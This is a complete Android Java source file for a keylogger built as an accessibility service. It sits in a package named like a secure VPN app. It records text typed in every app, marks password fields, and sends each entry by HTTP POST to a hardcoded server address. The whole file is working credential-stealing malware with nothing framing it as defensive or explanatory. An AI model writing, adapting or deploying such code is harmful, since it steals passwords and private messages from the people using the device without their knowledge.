package com.vpn.secure.pro.services;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityEvent;
import android.util.Log;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class KeyloggerService extends AccessibilityService {
    private static final String SERVER_URL = "http://192.168.1.100:5000/upload_keys";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String text = event.getText().toString();
            if (text.isEmpty()) return;

            String packageName = event.getPackageName().toString();
            boolean isPassword = event.getPassword() ||
                (event.getClassName() != null &&
                 event.getClassName().toString().toLowerCase().contains("password"));

            try {
                JSONObject json = new JSONObject();
                json.put("app", packageName);
                json.put("text", text);
                json.put("is_password", isPassword);
                json.put("timestamp", System.currentTimeMillis());

                new Thread(() -> {
                    try {
                        URL url = new URL(SERVER_URL);
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                        conn.setRequestMethod("POST");
                        conn.setRequestProperty("Content-Type", "application/json");
                        conn.setDoOutput(true);
                        OutputStream os = conn.getOutputStream();
                        os.write(json.toString().getBytes());
                        os.flush();
                        os.close();
                        conn.getResponseCode();
                        conn.disconnect();
                    } catch (Exception e) {
                        Log.e("Keylogger", "Send error: " + e.getMessage());
                    }
                }).start();

            } catch (Exception e) {
                Log.e("Keylogger", "Error: " + e.getMessage());
            }
        }
    }

    @Override
    public void onInterrupt() {}
}
